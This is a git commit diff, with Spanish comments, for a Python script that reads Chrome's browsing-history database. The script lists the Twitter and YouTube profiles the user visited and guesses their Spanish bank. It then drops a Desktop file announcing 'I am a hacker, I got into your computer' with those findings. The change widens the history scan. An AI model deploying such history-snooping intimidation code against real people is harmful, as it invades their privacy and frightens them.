9f49d8235d1dbfa97644b6792b5a3dd91e02e30c
Andreu Seguí <andreuseguisegura@gmail.com>
2022-07-28 10:29:13 +0200

    28-07-2022 Saber de que banco eres v2

--- spy_history_chrome.py
+++ spy_history_chrome.py
@@ -1,4 +1,3 @@
-import os
 import random
 import time
 import sqlite3
@@ -6,7 +5,7 @@ import pathlib
 import re
 
 
-NOMBRE_ARCHIVO = "espiar_perfiles_tw_fb_yt....txt"
+NOMBRE_ARCHIVO = "spy_history_chrome.txt"
 
 
 def get_user_path():
@@ -31,10 +30,11 @@ def get_chrome_data(user_path):
 
 def scare_user_with_twitter(hacker_doc, chrome_history):
     profiles_visited = []
-    for url in chrome_history[:1000]:
+    for url in chrome_history[:9999999]:
         results = re.findall("https://twitter.com/([A-Za-z0-9,._]+)$", url[1])
         if results and results[0] not in ["notifications", "home", "settings", "login", "signup"]:
             profiles_visited.append(results[0])
+    hacker_doc.write("\n")
     hacker_doc.write("He visto que has entrado a {} perfiles de twitter, y estos perfiles son:\n[{}]"
                      .format(len(profiles_visited), ", ".join(profiles_visited)))
 
@@ -42,26 +42,27 @@ def scare_user_with_twitter(hacker_doc, chrome_history):
 def scare_user_with_youtube(hacker_doc, chrome_history):
     profiles_visited = []
     hacker_doc.write("\n")
-    for url in chrome_history[:1000]:
+    for url in chrome_history[:9999999]:
         results = re.findall("https://www.youtube.com/[A-Za-z0-9,._]/([A-Za-z0-9,._]+)$", url[1])
         if results:
             profiles_visited.append(results[0])
-    hacker_doc.write("He visto que has entrado a {} perfiles de youtube, y estos perfiles son:\n[{}]"
-                     .format(len(profiles_visited), ", ".join(profiles_visited)))
+    hacker_doc.write("\n")
+    hacker_doc.write("He visto que has entrado a {} perfiles de youtube, y estos perfiles son:\n[{}]".format(len(profiles_visited), ", ".join(profiles_visited)))
 
 
 def scare_user_with_banks(hacker_doc, chrome_history):
     banks = ["BBVA", "Caixabank", "Santander", "Bankia", "Sabadell", "Abanca", "Unicaja", "Kutxobank", "Ibercaja"]
     bank = None
     hacker_doc.write("\n")
-    for url in chrome_history[:1000]:
+    for url in chrome_history[:9999999]:
         for b in banks:
             if b.lower() in url[0].lower():
                 bank = b
                 break
         if bank:
             break
-    hacker_doc.write("He visto que eres del banco: {}".format(bank))
+    hacker_doc.write("\n")
+    hacker_doc.write("He visto que eres del banco {}".format(bank))
 
 
 """def delay():
@@ -73,7 +74,7 @@ def scare_user_with_banks(hacker_doc, chrome_history):
 
 def crear_archivo(user_path):
     hacker_doc = open(user_path + "\\Desktop\\" + NOMBRE_ARCHIVO, "w", encoding="utf-8")
-    hacker_doc.write("Soy un hacker, me he colado en tu ordenador.\n\n")
+    hacker_doc.write("Soy un hacker, me he colado en tu ordenador.\n")
     return hacker_doc
 
 
